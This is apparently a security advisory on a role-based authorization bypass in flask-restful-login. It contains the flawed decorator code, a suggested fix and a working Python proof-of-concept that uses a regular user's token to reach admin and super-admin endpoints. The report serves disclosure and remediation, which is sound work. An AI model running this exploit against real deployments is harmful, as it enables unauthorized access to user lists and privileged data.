# Vulnerability Report

## Summary
- **Title**: Role-Based Authorization Bypass in flask-restful-login
- **Affected Version**: latest (as of 2026-06-28)
- **CWE**: CWE-863 - Incorrect Authorization
- **CVSS 3.1 Score**: 8.8 High (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
- **Vendor**: melihcolpan
- **Product**: flask-restful-login
- **Repository**: https://github.com/melihcolpan/flask-restful-login

## Description

A critical authorization bypass vulnerability exists in flask-restful-login's role-based permission system. The permission decorator in `api/roles/role_required.py` checks the user's role only when `request.authorization is None`. However, in Werkzeug 3.x (the version used by this project: 3.1.8), `request.authorization` correctly parses `Authorization: Bearer <token>` headers and returns a non-None `Authorization` object. This causes the entire role check to be skipped for every authenticated request.

As a result, any authenticated user with the lowest privilege level (admin=0) can access all admin-only and super-admin-only endpoints.

## Affected Component
- File: `api/roles/role_required.py`
- Function: `permission()` decorator
- Lines: 18-52

## Vulnerable Code

```python
def decorated(*args, **kwargs):
    auth = request.authorization              # NOT None with Werkzeug 3.x + Bearer tokens
    if auth is None and "Authorization" in request.headers:  # condition is ALWAYS False
        try:
            auth_type, token = request.headers["Authorization"].split(None, 1)
            data = jwt.loads(token)
            if data["admin"] < arg:
                return error.NOT_ADMIN         # never reached
        except ValueError:
            return error.HEADER_NOT_FOUND
        except Exception as why:
            logging.error(why)
            return error.INVALID_INPUT_422
    return f(*args, **kwargs)                  # always falls through, no role check
```

## Proof of Concept

### Steps to Reproduce

1. Register a normal user (admin=0): `POST /v1/auth/register`
2. Login to get a token: `POST /v1/auth/login`
3. Access admin-only endpoint with the normal user's token: `GET /v1/auth/data_admin`
4. Access super-admin-only endpoint: `GET /v1/auth/data_super_admin`
5. Access user list: `GET /v1/auth/users`
6. All requests succeed — the role check is never executed

### PoC Code

```python
import requests

BASE = "http://localhost:5000/v1/auth"

# Register a regular user
requests.post(f"{BASE}/register", json={
    "username": "attacker", "password": "password123", "email": "attacker@test.com"
})

# Login and get token
resp = requests.post(f"{BASE}/login", json={
    "email": "attacker@test.com", "password": "password123"
})
token = resp.json()["access_token"]

headers = {"Authorization": f"Bearer {token}"}

# Access admin-only endpoint as regular user
r = requests.get(f"{BASE}/data_admin", headers=headers)
print(f"Admin data: {r.status_code} {r.json()}")  # 200 OK - should be 403

# Access super-admin-only endpoint
r = requests.get(f"{BASE}/data_super_admin", headers=headers)
print(f"Super admin data: {r.status_code} {r.json()}")  # 200 OK - should be 403

# List all users
r = requests.get(f"{BASE}/users", headers=headers)
print(f"Users list: {r.status_code} {r.json()}")  # 200 OK - should be 403
```

## Impact

Any authenticated user can access all admin-protected endpoints, including listing all users, accessing admin data, and super-admin data. This completely nullifies the role-based access control system.

## Suggested Fix

```diff
 def decorated(*args, **kwargs):
-    auth = request.authorization
-    if auth is None and "Authorization" in request.headers:
-        try:
-            auth_type, token = request.headers["Authorization"].split(None, 1)
-            data = jwt.loads(token)
-            if data["admin"] < arg:
-                return error.NOT_ADMIN
-        except ValueError:
-            return error.HEADER_NOT_FOUND
-        except Exception as why:
-            logging.error(why)
-            return error.INVALID_INPUT_422
+    if "Authorization" in request.headers:
+        try:
+            auth_type, token = request.headers["Authorization"].split(None, 1)
+            data = jwt.loads(token)
+            if data.get("admin", 0) < arg:
+                return error.NOT_ADMIN
+        except ValueError:
+            return error.HEADER_NOT_FOUND
+        except Exception as why:
+            logging.error(why)
+            return error.INVALID_INPUT_422
+    else:
+        return error.HEADER_NOT_FOUND
     return f(*args, **kwargs)
```

## References
- CWE-863: https://cwe.mitre.org/data/definitions/863.html

## Credit
- Discovered by: goutou (https://github.com/goutouanquan)
- Contact: goutouanquan@163.com
